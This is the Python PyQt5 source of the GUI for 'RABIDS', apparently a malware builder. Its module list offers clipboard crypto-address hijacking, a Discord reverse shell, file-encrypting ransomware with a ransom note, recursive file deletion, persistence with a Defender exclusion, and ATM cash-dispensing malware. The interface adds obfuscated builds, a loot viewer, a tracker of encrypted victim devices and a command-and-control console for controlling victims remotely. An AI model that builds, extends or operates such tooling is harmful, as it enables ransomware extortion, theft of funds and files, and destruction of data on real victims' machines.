import sys
import os
from functools import partial
import re
import shlex
import subprocess
from pathlib import Path
import tempfile
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QComboBox, QCheckBox, QTextEdit, QLabel, QGroupBox,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, QListWidget, QScrollArea, QAbstractItemView,
    QListWidgetItem, QSizePolicy
)
import json
from PyQt5.QtGui import QFont, QPixmap, QMovie, QIcon
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject, QTimer, QUrl
from TABS.whispers.silentwhispers import SilentWhispersWidget

ASCII = r"""                                                                                                                                                                                                                         
"""

MODULES = {
    'module/ctrlvamp': {
        'desc': 'Hijacks clipboard crypto addresses (BTC, ETH, BEP-20, SOL).'
    },
    'module/dumpster': {
        'desc': 'Collects files from a directory and archives them into a single file.'
    },
    'module/ghostintheshell': {
        'desc': 'Provides a reverse shell over Discord for remote access.'
    },
    'module/krash': {
        'desc': 'Encrypts files in target directories and displays a ransom note.'
    },
    'module/poof': {
        'desc': 'Recursively deletes all files and folders from a target directory.'
    },
    'module/undeleteme': {
        'desc': 'Gains persistence and can add a Windows Defender exclusion.'
    },
    'module/byovf': {
        'desc': 'Bring your own Nim file and embed secondary files (e.g., drivers, DLLs).'
    },
    'module/bankruptsys': {
        'desc': 'An ATM malware module to dispense cash via XFS.'
    },
    'module/winkrashv2': {
        'desc': 'A ransomware module for Windows that uses direct syscalls.'
    }
}

def get_default_html_from_nim_file(file_path):
    """Extracts the defaultHtml const from the krash.nim file."""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        match = re.search(r'const defaultHtml = """(.*?)"""', content, re.DOTALL)
        if match:
            return match.group(1).strip()
    except Exception as e:
        print(f"Could not read default HTML from {file_path}: {e}")
    return "YOUR_HTML_RANSOM_NOTE_CONTENT_HERE"

krash_module_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'MODULE', 'krash.nim')
DEFAULT_KRASH_HTML = get_default_html_from_nim_file(krash_module_path)

MODULE_OPTIONS = {
    'module/ctrlvamp': {
        'btcAddress': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        'ethAddress': '0x1234567890abcdef1234567890abcdef12345678',
        'bep20Address': '0xabcdef1234567890abcdef1234567890abcdef12',
        'solAddress': '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R'
    },
    'module/dumpster': {
        'inputDir': '$HOME/Documents',
        'dumpsterFile': '$HOME/dumpster.dat'
    },
    'module/ghostintheshell': {
        'serverUrl': 'http://localhost:8080'
    },
    'module/krash': {
        'key': '0123456789abcdef0123456789abcdef',
        'iv': 'abcdef9876543210',
        'extension': '.locked',
        'targetDir': '$HOME/Documents',
        'htmlContent': DEFAULT_KRASH_HTML,
        'serverUrl': 'http://localhost:8080'
    },
    'module/poof': {
        'targetDir': '$HOME/Documents'
    },
    'module/undeleteme': {
        'persistence': 'true',
        'defenderExclusion': 'true'
    },
    'module/byovf': {
        'nimFile': 'path/to/your/module.nim',
        'embedFiles': 'path/to/driver.sys,path/to/cert.pem'
    },
    'module/bankruptsys': {
        'serverUrl': 'http://localhost:8080'
    },
    'module/winkrashv2': {
        'key': 'secret',
        'targetDir': '$HOME/Documents',
    }
}



class BuildThread(QThread):
    log_signal = pyqtSignal(str, str)
    finished_signal = pyqtSignal(int)

    def __init__(self, command):
        super().__init__()
        self.command = command

    def run(self):
        try:
            process = subprocess.Popen(
                self.command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                encoding='utf-8',
                errors='replace'
            )
            for line in iter(process.stdout.readline, ''):
                line = line.strip()
                msg_type = "system"
                if "[+]" in line:
                    msg_type = "success"
                elif "[Error]" in line or "compilation failed" in line.lower() or "failed with exit code" in line.lower():
                    msg_type = "error"
                self.log_signal.emit(line, msg_type)
            process.stdout.close()
            return_code = process.wait()
            self.finished_signal.emit(return_code)
        except FileNotFoundError:
            self.log_signal.emit("Error: A required command (like python or nim) was not found.", "error")
            self.finished_signal.emit(-1)
        except Exception as e:
            self.log_signal.emit(f"An unexpected error occurred during build: {e}", "error")
            self.finished_signal.emit(-1)


class DependencyInstallerThread(QThread):
    log_signal = pyqtSignal(str, str)
    finished_signal = pyqtSignal()
    
    def __init__(self, commands, parent=None):
        super().__init__(parent)
        self.commands = commands

    def run(self):
        for cmd in self.commands:
            self.run_command(cmd)
        self.finished_signal.emit()

    def run_command(self, cmd):
        # If cmd is a string, it's a shell command. Otherwise, it's a list of args.
        is_shell_command = isinstance(cmd, str)
        command_str = cmd if is_shell_command else ' '.join(shlex.quote(c) for c in cmd)

        self.log_signal.emit(f"[*] Running: {command_str}", "system")
        try:
            output = subprocess.check_output(
                cmd,
                stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='replace',
                shell=is_shell_command  # Use shell=True only for string commands
            )
            for line in output.splitlines():
                self.log_signal.emit(line.strip(), "system")
            self.log_signal.emit(f"[+] Command finished successfully.", "success")
        except FileNotFoundError:
            cmd_name = cmd.split()[0] if is_shell_command else cmd[0]
            self.log_signal.emit(f"[Error] Command '{cmd_name}' not found. Please ensure it is installed and in your PATH.", "error")
        except subprocess.CalledProcessError as e:
            self.log_signal.emit(f"[-] Command failed with exit code {e.returncode}. Output:", "error")
            for line in e.output.splitlines():
                self.log_signal.emit(line.strip(), "error")

class ModuleTableWidget(QTableWidget):
    """A QTableWidget that supports drag-and-drop row reordering."""
    reorder_signal = pyqtSignal(list)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setDragDropMode(QAbstractItemView.InternalMove)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setSelectionMode(QAbstractItemView.SingleSelection)

    def dropEvent(self, event):
        if event.source() == self and (event.dropAction() == Qt.MoveAction or self.dragDropMode() == QAbstractItemView.InternalMove):
            source_row = self.selectionModel().currentIndex().row()
            dest_row = self.indexAt(event.pos()).row()
            if dest_row == -1:
                dest_row = self.rowCount() -1

            current_order = []
            for row in range(self.rowCount()):
                item = self.item(row, 0)
                if item and item.data(Qt.UserRole):
                    current_order.append(item.data(Qt.UserRole))
            
            moved_item = current_order.pop(source_row)
            current_order.insert(dest_row, moved_item)

            self.reorder_signal.emit(current_order)
            event.accept()
            event.setDropAction(Qt.IgnoreAction)
        else:
            super().dropEvent(event)

class RABIDSGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RABIDS")
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.setGeometry(100, 100, 1000, 800)
        self.setWindowIcon(QIcon(os.path.join(self.script_dir, "ASSETS", "icon.png")))
        self.selected_modules = []
        self.loading_movie = None
        self.build_thread = None
        self.installer_thread = None
        self.option_inputs = {}
        self.current_option_values = {}
        self.module_options_group = None
        self.loot_files_list = None
        self.silent_whispers_widget = None
        self.init_ui()
        self.load_settings()

    def init_ui(self):
        self.setStyleSheet("""
        QMainWindow, QWidget {
            background-color: #111113;
            color: #e0e0e0;
        }
        QPushButton {
            background-color: #1D1D1F;
            padding: 6px;
            font-size: 10pt;
            border-radius: 10px;
        }
        QPushButton:hover {
            background-color: #2a2a2e;
        }
        QPushButton:pressed {
            background-color: #3c3c40;
        }
        QLineEdit, QComboBox, QCheckBox {
            font-weight: normal;
            padding: 4px;
            border-radius: 5px;
            background-color: #1D1D1F;
        }
        QGroupBox {
            border: none;
            margin-top: 10px;
            padding-top: 10px;
            font-weight: bold;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 10px;
        }
        QTabWidget::pane {
            padding: 0;
            margin: 0;
            border: none;
        }
        QTabBar::tab {
            background: #1D1D1F;
            color: #e0e0e0;
            padding: 6px;
            border-radius: 10px;
            margin-right: 4px;
        }
        QTabBar::tab:selected {
            background: #2a2a2e;
            color: white;
        }
        QFrame {
            border: none;
        }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        self.tab_widget = QTabWidget()
        self.tab_widget.currentChanged.connect(self.on_tab_changed)
        main_layout.addWidget(self.tab_widget)

        builder_widget = QWidget()
        builder_layout = QHBoxLayout(builder_widget)

        title_font = QFont()
        title_font.setBold(True)
        title_font.setPointSize(12)
        subtitle_font = QFont()
        subtitle_font.setPointSize(10)

        left_layout = QVBoxLayout()

        self.module_options_group = QGroupBox("MODULE OPTIONS")
        self.module_options_group.setFont(title_font)
        module_options_group_layout = QVBoxLayout(self.module_options_group)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content_widget = QWidget()
        self.options_layout = QVBoxLayout(scroll_content_widget)

        scroll_area.setWidget(scroll_content_widget)
        module_options_group_layout.addWidget(scroll_area)
        left_layout.addWidget(self.module_options_group, stretch=7)
        
        build_options_group = QGroupBox("BUILD OPTIONS")
        build_options_group.setFont(title_font)
        build_options_layout = QVBoxLayout(build_options_group)
        build_options_layout.setSpacing(10)

        exe_name_layout = QHBoxLayout()
        exe_name_label = QLabel("EXE NAME")
        exe_name_label.setFont(subtitle_font)
        self.exe_name_input = QLineEdit("payload")
        self.exe_name_input.setFont(subtitle_font)
        exe_name_layout.addWidget(exe_name_label)
        exe_name_layout.addWidget(self.exe_name_input, 1)

        target_os_label = QLabel("OS")
        target_os_label.setFont(subtitle_font) 
        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["windows", "linux", "macos"])
        self.target_os_combo.setFont(subtitle_font)
        self.target_os_combo.currentTextChanged.connect(self.update_windows_only_options)
        exe_name_layout.addWidget(target_os_label)
        exe_name_layout.addWidget(self.target_os_combo, 1)
        target_arch_label = QLabel("PROCESSOR")
        target_arch_label.setFont(subtitle_font)
        self.target_arch_combo = QComboBox()
        self.target_arch_combo.addItems(["amd64", "arm64"])
        self.target_arch_combo.setFont(subtitle_font)
        exe_name_layout.addWidget(target_arch_label)
        exe_name_layout.addWidget(self.target_arch_combo, 1)
        build_options_layout.addLayout(exe_name_layout)

        win_options_layout = QHBoxLayout()
        self.hide_console_check = QCheckBox("HIDE CONSOLE")
        self.hide_console_check.setFont(subtitle_font)
        self.hide_console_check.setChecked(True)
        win_options_layout.addWidget(self.hide_console_check)

        self.obfuscate_check = QCheckBox("OBFUSCATE")
        self.obfuscate_check.setFont(subtitle_font)
        self.obfuscate_check.setChecked(False)
        self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
        win_options_layout.addWidget(self.obfuscate_check)

        self.ollvm_input = QLineEdit("")
        self.ollvm_input.setPlaceholderText("e.g., -fla -sub -bcf")
        self.ollvm_input.setFont(subtitle_font)
        win_options_layout.addWidget(self.ollvm_input, 1)
        build_options_layout.addLayout(win_options_layout)
        
        left_layout.addWidget(build_options_group)

        build_btn_layout = QHBoxLayout()
        self.build_btn = QPushButton("BUILD")
        self.build_btn.setFont(subtitle_font)
        self.build_btn.clicked.connect(self.run_compiler)
        build_btn_layout.addWidget(self.build_btn)
        left_layout.addLayout(build_btn_layout)

        banner_layout = QHBoxLayout()
        self.banner_label = QLabel("Banner Placeholder")
        self.banner_label.setFont(subtitle_font)
        banner_path = os.path.join(self.script_dir, "ASSETS", "banner.png")
        movie = QMovie(banner_path)
        if movie.isValid():
            self.banner_label.setMovie(movie)
            movie.start()
        self.banner_label.setFixedHeight(50)
        self.banner_label.setAlignment(Qt.AlignCenter)
        banner_layout.addWidget(self.banner_label, stretch=1)
        left_layout.addLayout(banner_layout)
        builder_layout.addLayout(left_layout, 6)

        right_layout = QVBoxLayout()
        module_select_layout = QVBoxLayout()
        module_select_layout.setContentsMargins(0, 12, 0, 0)
        module_label = QLabel("MODULES")
        module_label.setFont(title_font)
        module_select_layout.addWidget(module_label)
        self.module_combo = QComboBox()
        self.module_combo.setFont(subtitle_font)
        self.module_combo.addItem("SELECT MODULE")
        for module in MODULES.keys():
            self.module_combo.addItem(module.split('/')[-1])
        self.module_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        module_select_layout.addWidget(self.module_combo)

        module_buttons_layout = QHBoxLayout()
        self.add_module_btn = QPushButton("ADD MODULE")
        self.add_module_btn.setFont(subtitle_font)
        self.add_module_btn.clicked.connect(self.add_module)
        module_buttons_layout.addWidget(self.add_module_btn)
        module_select_layout.addLayout(module_buttons_layout)
        right_layout.addLayout(module_select_layout)

        module_chain_label = QLabel("MODULE CHAIN")
        module_chain_label.setFont(title_font)
        right_layout.addWidget(module_chain_label)
        self.module_table = ModuleTableWidget()
        self.module_table.setFont(subtitle_font)
        self.module_table.setColumnCount(2)
        self.module_table.setHorizontalHeaderLabels(["Module", ""])
        self.module_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.module_table.setColumnWidth(1, 50)
        self.module_table.setStyleSheet("background-color: #111113;")
        self.module_table.reorder_signal.connect(self.reorder_modules)
        right_layout.addWidget(self.module_table)
        self.module_table.itemClicked.connect(self.on_module_item_clicked)

        builder_layout.addLayout(right_layout, 4)

        output_widget = QWidget()
        output_layout = QVBoxLayout(output_widget)
        output_layout.setContentsMargins(15, 15, 15, 15)
        self.output_log = QTextEdit()
        self.output_log.setFont(subtitle_font)
        self.output_log.setReadOnly(True)
        self.output_log.setPlaceholderText(ASCII)
        self.output_log.setStyleSheet("background-color: #111113; color: #00A9FD;")
        output_layout.addWidget(self.output_log, 3)

        loot_section_layout = QHBoxLayout()

        folder_icon_label = QLabel()
        folder_icon_path = os.path.join(self.script_dir, "ASSETS", "folder.png")
        pixmap = QPixmap(folder_icon_path)
        if not pixmap.isNull():
            folder_icon_label.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        folder_icon_label.setAlignment(Qt.AlignCenter)
        loot_section_layout.addWidget(folder_icon_label, 2)

        loot_content_widget = QWidget()
        loot_content_layout = QVBoxLayout(loot_content_widget)
        loot_content_layout.setContentsMargins(0, 0, 0, 0)

        loot_header_layout = QHBoxLayout()
        loot_label = QLabel("LOOT")
        loot_label.setFont(title_font)
        loot_header_layout.addWidget(loot_label)
        loot_header_layout.addStretch()
        refresh_loot_btn = QPushButton("⟳ Refresh")
        refresh_loot_btn.clicked.connect(self.update_loot_folder_view)
        loot_header_layout.addWidget(refresh_loot_btn)
        open_loot_btn = QPushButton("Open Folder")
        open_loot_btn.clicked.connect(self.open_loot_folder)
        loot_header_layout.addWidget(open_loot_btn)
        loot_content_layout.addLayout(loot_header_layout)

        self.loot_files_list = QListWidget()
        self.loot_files_list.setFont(subtitle_font)
        self.loot_files_list.setStyleSheet("background-color: #1D1D1F;")
        loot_content_layout.addWidget(self.loot_files_list)

        loot_section_layout.addWidget(loot_content_widget, 8)
        output_layout.addLayout(loot_section_layout, 1)

        docs_widget = QWidget()
        docs_layout = QVBoxLayout(docs_widget)
        docs_layout.setContentsMargins(15, 15, 15, 15)

        docs_text = QTextEdit()
        docs_text.setFont(subtitle_font)
        docs_text.setReadOnly(True)

        doc_path = os.path.join(self.script_dir, "DOC.md")
        try:
            with open(doc_path, 'r', encoding='utf-8') as f:
                doc_content = f.read()
            docs_text.setMarkdown(doc_content)
        except FileNotFoundError:
            docs_text.setText("Error: DOCUMENTATION.md not found.")

        docs_text.setStyleSheet("background-color: #111113;")
        docs_layout.addWidget(docs_text)

        garbage_collector_widget = QWidget()
        garbage_collector_layout = QVBoxLayout(garbage_collector_widget)
        garbage_collector_layout.setContentsMargins(15, 15, 15, 15)
        garbage_collector_layout.setSpacing(15)

        top_widget = QWidget()
        top_layout = QHBoxLayout(top_widget)

        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        icon_label.setAlignment(Qt.AlignCenter)
        top_layout.addWidget(icon_label, 3)

        restore_options_group = QGroupBox("RESTORE FILES FROM DUMPSTER")
        restore_options_group.setFont(title_font)
        restore_options_layout = QVBoxLayout(restore_options_group)

        desc_label = QLabel("Select a dumpster file and a destination directory to restore its contents.\nCopy all the desired files you want from victim's system")
        desc_label.setFont(subtitle_font)
        desc_label.setStyleSheet("color: #00B85B;")
        desc_label.setWordWrap(True)
        restore_options_layout.addWidget(desc_label)

        dumpster_file_label = QLabel("Dumpster File Path")
        dumpster_file_label.setFont(subtitle_font)
        dumpster_file_label.setStyleSheet("color: #93dbb6;")
        dumpster_file_layout = QHBoxLayout()
        self.restore_dumpster_file_edit = QLineEdit()
        dumpster_file_btn = QPushButton("Browse...")
        dumpster_file_btn.clicked.connect(lambda: self.browse_open_file(self.restore_dumpster_file_edit))
        dumpster_file_layout.addWidget(dumpster_file_label)
        dumpster_file_layout.addWidget(self.restore_dumpster_file_edit)
        dumpster_file_layout.addWidget(dumpster_file_btn)
        restore_options_layout.addLayout(dumpster_file_layout)

        output_dir_label = QLabel("Destination Directory")
        output_dir_label.setFont(subtitle_font)
        output_dir_label.setStyleSheet("color: #93dbb6;")
        output_dir_layout = QHBoxLayout()
        self.restore_output_dir_edit = QLineEdit()
        output_dir_btn = QPushButton("Browse...")
        output_dir_btn.clicked.connect(lambda: self.browse_directory(self.restore_output_dir_edit))
        output_dir_layout.addWidget(output_dir_label)
        output_dir_layout.addWidget(self.restore_output_dir_edit)
        output_dir_layout.addWidget(output_dir_btn)
        restore_options_layout.addLayout(output_dir_layout)

        restore_btn = QPushButton("Restore")
        restore_btn.setFont(subtitle_font)
        restore_btn.clicked.connect(self.run_garbage_collector_restore)
        restore_options_layout.addWidget(restore_btn)
        restore_options_layout.addStretch()
        top_layout.addWidget(restore_options_group, 7)

        bottom_widget = QWidget()
        bottom_layout = QVBoxLayout(bottom_widget)

        dest_folder_group = QGroupBox()
        dest_folder_layout = QVBoxLayout(dest_folder_group)

        dest_header_layout = QHBoxLayout()
        refresh_dest_btn = QPushButton("⟳ Refresh")
        refresh_dest_btn.clicked.connect(self.update_restore_destination_view)
        dest_header_layout.addWidget(refresh_dest_btn, 0, Qt.AlignRight)
        dest_folder_layout.addLayout(dest_header_layout)

        self.restore_dest_files_list = QListWidget()
        self.restore_dest_files_list.setFont(subtitle_font)
        self.restore_dest_files_list.setStyleSheet("background-color: #1D1D1F;")
        dest_folder_layout.addWidget(self.restore_dest_files_list)
        bottom_layout.addWidget(dest_folder_group)

        garbage_collector_layout.addWidget(top_widget, 4)
        garbage_collector_layout.addWidget(bottom_widget, 6)

        uncrash_widget = QWidget()
        uncrash_layout = QVBoxLayout(uncrash_widget)
        uncrash_layout.setContentsMargins(15, 15, 15, 15)
        uncrash_layout.setSpacing(15)

        uncrash_options_group = QGroupBox("DECRYPTOR")
        uncrash_options_group.setFont(title_font)
        uncrash_options_layout = QVBoxLayout(uncrash_options_group)

        uncrash_desc_label = QLabel("Build a standalone decryptor for files encrypted by the 'krash' module.\nEnsure the Key and IV match the ones used for encryption.")
        uncrash_desc_label.setFont(subtitle_font)
        uncrash_desc_label.setStyleSheet("color: #FFF200;")
        uncrash_desc_label.setWordWrap(True)
        uncrash_options_layout.addWidget(uncrash_desc_label)
        uncrash_options_layout.addSpacing(10)

        key_layout = QHBoxLayout()
        key_label = QLabel("Key")
        key_label.setFont(subtitle_font)
        key_label.setStyleSheet("color: #f7f294;")
        self.uncrash_key_edit = QLineEdit("0123456789abcdef0123456789abcdef")
        self.uncrash_key_edit.setFont(subtitle_font)
        key_layout.addWidget(key_label)
        key_layout.addWidget(self.uncrash_key_edit)
        uncrash_options_layout.addLayout(key_layout)

        iv_layout = QHBoxLayout()
        iv_label = QLabel("IV")
        iv_label.setFont(subtitle_font)
        iv_label.setStyleSheet("color: #f7f294;")
        self.uncrash_iv_edit = QLineEdit("abcdef9876543210")
        self.uncrash_iv_edit.setFont(subtitle_font)
        iv_layout.addWidget(iv_label)
        iv_layout.addWidget(self.uncrash_iv_edit)
        uncrash_options_layout.addLayout(iv_layout)

        ext_layout = QHBoxLayout()
        ext_label = QLabel("Extension")
        ext_label.setFont(subtitle_font)
        ext_label.setStyleSheet("color: #f7f294;")
        self.uncrash_ext_edit = QLineEdit(".locked")
        self.uncrash_ext_edit.setFont(subtitle_font)
        ext_layout.addWidget(ext_label)
        ext_layout.addWidget(self.uncrash_ext_edit)
        uncrash_options_layout.addLayout(ext_layout)

        uncrash_build_options_layout = QHBoxLayout()
        uncrash_exe_label = QLabel("EXE Name")
        uncrash_exe_label.setFont(subtitle_font)
        uncrash_exe_label.setStyleSheet("color: #f7f294;")
        self.uncrash_exe_name_edit = QLineEdit("decryptor")
        uncrash_os_label = QLabel("OS")
        uncrash_os_label.setFont(subtitle_font) 
        self.uncrash_os_combo = QComboBox()
        self.uncrash_os_combo.addItems(["windows", "linux", "macos"])
        uncrash_arch_label = QLabel("Processor")
        uncrash_arch_label.setFont(subtitle_font)
        self.uncrash_arch_combo = QComboBox()
        self.uncrash_arch_combo.addItems(["amd64", "arm64"])
        uncrash_build_options_layout.addWidget(uncrash_exe_label)
        uncrash_build_options_layout.addWidget(self.uncrash_exe_name_edit, 1)
        uncrash_build_options_layout.addWidget(uncrash_os_label)
        uncrash_build_options_layout.addWidget(self.uncrash_os_combo, 1)
        uncrash_build_options_layout.addWidget(uncrash_arch_label)
        uncrash_build_options_layout.addWidget(self.uncrash_arch_combo, 1)
        uncrash_options_layout.addLayout(uncrash_build_options_layout)

        self.uncrash_build_btn = QPushButton("BUILD DECRYPTOR")
        self.uncrash_build_btn.setFont(subtitle_font)
        self.uncrash_build_btn.clicked.connect(self.run_uncrash_compiler)
        uncrash_options_layout.addWidget(self.uncrash_build_btn)

        uncrash_options_layout.addStretch()
        uncrash_layout.addWidget(uncrash_options_group)

        bottom_section_layout = QHBoxLayout()

        left_column_widget = QWidget()
        left_column_layout = QVBoxLayout(left_column_widget)
        
        devices_header_layout = QHBoxLayout()
        encrypted_devices_label = QLabel("LIVE ENCRYPTED DEVICES")
        encrypted_devices_label.setFont(title_font)
        devices_header_layout.addWidget(encrypted_devices_label)
        devices_header_layout.addStretch()
        left_column_layout.addLayout(devices_header_layout)

        live_devices_desc_label = QLabel("This panel displays a live list of devices successfully encrypted by the 'krash' module.\n"
                                         "Devices report back via HTTP server.")
        live_devices_desc_label.setFont(subtitle_font)
        live_devices_desc_label.setStyleSheet("color: #FFF100;")
        live_devices_desc_label.setWordWrap(True)
        left_column_layout.addWidget(live_devices_desc_label)

        listener_controls_layout = QHBoxLayout()
        self.toggle_listener_btn = QPushButton("Connect")
        self.toggle_listener_btn.setFont(subtitle_font)
        self.toggle_listener_btn.clicked.connect(self.toggle_discord_listener)
        self.refresh_listener_btn = QPushButton("⟳ Refresh")
        self.refresh_listener_btn.setFont(subtitle_font)
        self.refresh_listener_btn.clicked.connect(self.refresh_discord_listener)
        listener_controls_layout.addStretch()
        listener_controls_layout.addWidget(self.refresh_listener_btn)
        listener_controls_layout.addWidget(self.toggle_listener_btn)
        left_column_layout.addLayout(listener_controls_layout)

        self.encrypted_devices_table = QTableWidget()
        self.encrypted_devices_table.setColumnCount(1)
        self.encrypted_devices_table.setHorizontalHeaderLabels(["Device"])
        self.encrypted_devices_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)

        left_column_layout.addWidget(self.encrypted_devices_table)
        
        uncrash_image_label = QLabel()
        uncrash_image_path = os.path.join(self.script_dir, "ASSETS", "unkrash.png")
        pixmap = QPixmap(uncrash_image_path)
        if not pixmap.isNull():
            uncrash_image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        uncrash_image_label.setAlignment(Qt.AlignCenter)

        bottom_section_layout.addWidget(left_column_widget, 6)
        bottom_section_layout.addWidget(uncrash_image_label, 4) 

        uncrash_layout.addLayout(bottom_section_layout)

        c2_widget = QWidget()
        c2_main_layout = QHBoxLayout(c2_widget)
        c2_main_layout.setContentsMargins(15, 15, 15, 15)

        c2_left_column_widget = QWidget()
        c2_left_layout = QVBoxLayout(c2_left_column_widget)
        c2_left_layout.setContentsMargins(0, 0, 0, 0)
        
        c2_header_layout = QHBoxLayout()
        c2_title = QLabel("COMMAND AND CONTROL")
        c2_title.setFont(title_font)
        c2_header_layout.addWidget(c2_title)
        c2_left_layout.addLayout(c2_header_layout)

        c2_desc = QLabel("Connect to RAT to send commands to and receive output from the 'ghostintheshell' payload.\nCommunication via HTTP Server\nControl victim's device remotely")
        c2_desc.setFont(subtitle_font)
        c2_desc.setStyleSheet("color: #00A9FD;")
        c2_desc.setWordWrap(True)
        c2_left_layout.addWidget(c2_desc)

        self.c2_connect_btn = QPushButton("Connect")
        self.c2_connect_btn.clicked.connect(self.toggle_c2_connection)
        c2_left_layout.addWidget(self.c2_connect_btn)

        self.c2_log = QTextEdit()
        self.c2_log.setReadOnly(True)
        self.c2_log.setFont(subtitle_font)
        self.c2_log.setStyleSheet("background-color: #1D1D1F;")
        c2_left_layout.addWidget(self.c2_log)

        c2_input_layout = QHBoxLayout()
        self.c2_cmd_input = QLineEdit()
        self.c2_cmd_input.setPlaceholderText("Enter command to send...")
        self.c2_cmd_input.returnPressed.connect(self.send_c2_message)
        self.c2_cmd_input.setEnabled(False)

        self.c2_send_btn = QPushButton("Send")
        self.c2_send_btn.clicked.connect(self.send_c2_message)
        self.c2_send_btn.setEnabled(False)

        c2_input_layout.addWidget(self.c2_cmd_input, 1)
        c2_input_layout.addWidget(self.c2_send_btn)
        c2_left_layout.addLayout(c2_input_layout)

        c2_image_label = QLabel()
        c2_image_path = os.path.join(self.script_dir, "ASSETS", "c2.png")
        pixmap = QPixmap(c2_image_path)
        if not pixmap.isNull():
            c2_image_label.setPixmap(pixmap.scaled(300, 800, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        c2_image_label.setAlignment(Qt.AlignCenter)

        c2_main_layout.addWidget(c2_left_column_widget, 6)
        c2_main_layout.addWidget(c2_image_label, 4)

        settings_widget = QWidget()
        settings_layout = QVBoxLayout(settings_widget)
        settings_layout.setContentsMargins(0, 15, 0, 15)

        def create_setting_layout(label_text, input_widget, description_text):
            setting_layout = QVBoxLayout()
            label_layout = QHBoxLayout()
            label = QLabel(label_text)
            label.setFont(subtitle_font)
            desc_label = QLabel(description_text)
            desc_label.setFont(QFont("Arial", 8))
            desc_label.setStyleSheet("color: #808080;")
            desc_label.setWordWrap(True)
            setting_layout.setContentsMargins(15, 0, 15, 0)
            label_layout.addWidget(label)
            setting_layout.addLayout(label_layout)
            setting_layout.addWidget(input_widget)
            setting_layout.addWidget(desc_label)
            setting_layout.addSpacing(10)
            return setting_layout

        server_url_label = QLabel("HTTP Server URL")
        self.settings_server_url_edit = QLineEdit()
        server_url_desc = "The URL of your HTTP C2 server. Example: http://your-server.com:8080"
        server_url_layout = create_setting_layout(server_url_label.text(), self.settings_server_url_edit, server_url_desc)
        settings_layout.addLayout(server_url_layout)

        settings_layout.addSpacing(20)

        installer_group = QGroupBox("Dependency Installation")
        installer_group.setFont(title_font)
        installer_layout = QVBoxLayout(installer_group)
        installer_layout.setContentsMargins(15, 0, 15, 0)
        
        installer_desc = QLabel("Install the core compilers and their required packages. It is recommended to run these in order.")
        installer_desc.setFont(subtitle_font)
        installer_desc.setWordWrap(True)
        installer_layout.addWidget(installer_desc)

        # New buttons for Nim and Rust installation
        self.install_nim_tool_btn = QPushButton("Install Nim")
        self.install_nim_tool_btn.clicked.connect(self.install_nim_tool)
        installer_layout.addWidget(self.install_nim_tool_btn)

        self.install_rust_tool_btn = QPushButton("Install Rust")
        self.install_rust_tool_btn.clicked.connect(self.install_rust_tool)
        installer_layout.addWidget(self.install_rust_tool_btn)

        self.install_py_btn = QPushButton("Install Python Packages")
        self.install_py_btn.clicked.connect(self.run_python_installer)
        installer_layout.addWidget(self.install_py_btn)

        self.install_nim_btn = QPushButton("Install Nimble Packages")
        self.install_nim_btn.clicked.connect(self.run_nim_installer)
        installer_layout.addWidget(self.install_nim_btn)

        openssl_note = QLabel('For Windows, if the Nim build fails with SSL errors, you may need to manually download OpenSSL from <a href="https://openssl-library.org/source/">https://openssl-library.org/source/</a>')
        openssl_note.setOpenExternalLinks(True)
        openssl_note.setFont(QFont("Arial", 8))
        openssl_note.setStyleSheet("color: #808080;")
        openssl_note.setWordWrap(True)
        installer_layout.addWidget(openssl_note)

        self.install_rust_btn = QPushButton("Install Rust Targets")
        self.install_rust_btn.clicked.connect(self.run_rust_installer)
        installer_layout.addWidget(self.install_rust_btn)

        docker_group = QGroupBox("Obfuscation Dependencies (Optional)")
        docker_group.setFont(title_font)
        docker_layout = QVBoxLayout(docker_group)
        docker_layout.setContentsMargins(0, 0, 0, 0)

        docker_desc = QLabel("The obfuscation feature requires Docker. This will pull the large Obfuscator-LLVM image from the container registry.")
        docker_desc.setFont(subtitle_font)
        docker_desc.setWordWrap(True)
        docker_layout.addWidget(docker_desc)

        self.install_docker_btn = QPushButton("Pull Docker Image")
        self.install_docker_btn.clicked.connect(self.run_docker_installer)
        docker_layout.addWidget(self.install_docker_btn)

        installer_layout.addWidget(docker_group)

        self.installer_buttons = [self.install_nim_tool_btn, self.install_rust_tool_btn, self.install_py_btn, self.install_nim_btn, self.install_rust_btn, self.install_docker_btn]


        settings_layout.addWidget(installer_group)

        settings_layout.addStretch()

        save_settings_btn = QPushButton("Save Settings")
        save_settings_btn.setFont(subtitle_font)
        save_settings_btn.clicked.connect(self.save_settings)
        save_btn_container = QWidget()
